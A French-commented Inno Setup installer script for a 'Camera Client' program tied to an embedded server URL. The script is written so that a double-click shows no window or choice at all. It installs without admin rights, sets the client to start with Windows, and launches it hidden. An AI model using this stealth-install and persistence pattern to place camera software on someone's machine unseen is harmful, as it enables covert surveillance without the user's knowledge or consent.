; Installateur Windows du client caméra — 100 % silencieux, sans saisie.
; Nécessite Inno Setup (gratuit) : https://jrsoftware.org/isinfo.php
; Compilation : ISCC packaging\windows\installer.iss
; (le script build_windows.bat le fait automatiquement s'il trouve ISCC)
;
; Le résultat, CameraClient-Setup.exe, ne nécessite PAS Python sur la
; machine de l'utilisateur : dist\CameraClient.exe (fabriqué par
; PyInstaller) embarque déjà tout l'interpréteur ET l'URL du serveur
; (voir embedded_config.py, généré par build_windows.bat).
;
; Comportement : un simple double-clic sur CameraClient-Setup.exe
;   - n'affiche AUCUNE fenêtre (il se relance lui-même en mode très silencieux) ;
;   - installe le client dans le profil de l'utilisateur (pas d'admin requis) ;
;   - active le démarrage automatique avec Windows ;
;   - lance le client immédiatement, en arrière-plan, sans fenêtre.
; Les options /VERYSILENT, /SUPPRESSMSGBOX, /NORESTART restent acceptées
; (déploiement par script, GPO...), mais ne sont plus nécessaires.
;
; IMPORTANT : ce script vit dans packaging\windows\, PAS dans build\windows\.
; build\ est l'espace de travail de PyInstaller (il est nettoyé/recréé à
; chaque build avec --clean) : tout fichier qui y vivrait serait supprimé.

#define MyAppName "Camera Client"
#define MyAppVersion "1.0"
#define MyAppExeName "CameraClient.exe"

[Setup]
; AppId unique : ne changez jamais cette ligne, sinon les mises à jour
; s'installeront côte à côte au lieu de remplacer l'ancienne version.
AppId={{2F2C5B3E-7A1D-4B7A-9B2E-CAMERACLIENT1}}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher=Selon Randriavao
DefaultDirName={autopf}\{#MyAppName}
; Pas de page de choix du dossier, pas de page de bienvenue, pas de page
; « prêt à installer » : l'utilisateur ne doit RIEN voir ni choisir.
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableDirPage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
; Installation dans le profil utilisateur, sans UAC (pas d'admin requis).
PrivilegesRequired=lowest
; Un seul installateur à la fois : évite les doubles lancements concurrents.
SetupMutex=Global\CameraClientSetupMutex
ArchitecturesInstallIn64BitMode=x64compatible
OutputDir=..\..\releases
OutputBaseFilename=CameraClient-Setup
Compression=lzma
SolidCompression=yes
UninstallDisplayIcon={app}\{#MyAppExeName}
UninstallDisplayName={#MyAppName}

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "..\..\dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
; Démarrage automatique avec la session Windows (toujours activé).
Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Run]
; Lancement immédiat, en arrière-plan, y compris en mode silencieux
; (pas de « skipifsilent », sinon le client ne démarrerait qu'à la prochaine session).
Filename: "{app}\{#MyAppExeName}"; Flags: nowait runhidden runasoriginaluser

[UninstallRun]
Filename: "{sys}\taskkill.exe"; Parameters: "/F /IM {#MyAppExeName}"; Flags: runhidden; RunOnceId: "StopCameraClient"

[UninstallDelete]
Type: filesandordirs; Name: "{localappdata}\CameraClient"

[Code]
{ ---------------------------------------------------------------------------
  Relance automatique en mode silencieux au double-clic.

  Objectif STRICT : double-clic = EXACTEMENT le comportement de
    CameraClient-Setup.exe /VERYSILENT /SUPPRESSMSGBOX /NORESTART /LOG="..."
  c'est-à-dire : aucune interface, installation complète, log écrit.

  Méthode fiable :
   1. Si l'utilisateur a déjà passé /VERYSILENT ou /SILENT → on ne fait rien,
      l'installateur continue normalement (mode silencieux déjà demandé).
   2. Sinon (double-clic) → on relance CE MÊME exécutable avec les arguments
      silencieux + un /LOG systématique, en ATTENDANT la fin, puis on quitte.

  Pourquoi Exec + ewWaitUntilTerminated (et PAS ShellExec ni ewNoWait) :
   - ewNoWait : le parent meurt avant que l'enfant ait fini son init → Windows
     peut avorter le lancement → rien ne se passe (bug initial).
   - ShellExec + SW_HIDE : fragile quand l'exe se relance lui-même (conflit
     de handle, SmartScreen) → échec silencieux → rien ne s'installe
     (bug constaté : « le clic marche mais n'exécute pas »).
   - Exec + ewWaitUntilTerminated : le parent RESTE VIVANT pendant toute
     l'installation de l'enfant, puis quitte. C'est la méthode éprouvée.

  Pourquoi un /LOG systématique :
   - En cas d'échec, l'utilisateur peut consulter
     %TEMP%\CameraClient-Setup.log pour comprendre.
   - Le log n'apparaît PAS dans l'interface (il est écrit silencieusement) :
     il ne change rien à l'objectif « aucune interface ».

  Fallback :
   - Si la relance échoue (Exec retourne False, antivirus...), on NE quitte
     PAS silencieusement : on laisse l'installateur continuer normalement
     (il affichera ses pages). Mieux vaut une interface que rien du tout.
  --------------------------------------------------------------------------- }
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
  Params: String;
  LogPath: String;
begin
  Result := True;

  { Mode silencieux déjà demandé (script, GPO, ligne de commande) :
    on ne relance pas, on laisse l'installateur continuer. }
  if WizardSilent then
  begin
    Result := True;
    Exit;
  end;

  { Double-clic : on prépare les arguments EXACTS du mode silencieux. }
  Params := '/VERYSILENT /SUPPRESSMSGBOX /NORESTART';

  { /LOG systématique : écrit dans %TEMP%, sans aucune fenêtre. }
  LogPath := ExpandConstant('{tmp}') + '\CameraClient-Setup.log';
  { On supprime l'ancien log pour ne pas mélanger deux exécutions. }
  if FileExists(LogPath) then
    DeleteFile(LogPath);
  Params := Params + ' /LOG="' + LogPath + '"';

  { Relance de CE MÊME exécutable, en attendant la fin. }
  if not Exec(ExpandConstant('{srcexe}'), Params, '',
              SW_HIDE, ewWaitUntilTerminated, ResultCode) then
  begin
    { La relance a échoué : on continue normalement plutôt que de quitter
      sans rien faire. L'utilisateur verra au moins l'interface. }
    Result := True;
    Exit;
  end;

  { L'enfant a terminé son installation : on quitte sans rien afficher. }
  Result := False;
end;

{ Mise à jour : arrête l'ancienne instance du client pour pouvoir remplacer
  le .exe pendant l'installation. }
function PrepareToInstall(var NeedsRestart: Boolean): String;
var
  ResultCode: Integer;
begin
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM {#MyAppExeName}', '',
       SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := '';
end;